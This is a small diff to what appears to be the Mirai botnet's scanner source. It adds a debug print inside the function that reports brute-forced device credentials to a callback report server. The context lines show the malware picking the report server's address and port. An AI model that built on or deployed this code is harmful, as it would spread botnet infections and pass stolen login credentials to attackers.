@@ -926,6 +926,9 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
 #endif
         return;
     }
+#ifdef DEBUG
+        printf("[report] resolved report address\n");
+#endif
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
     addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
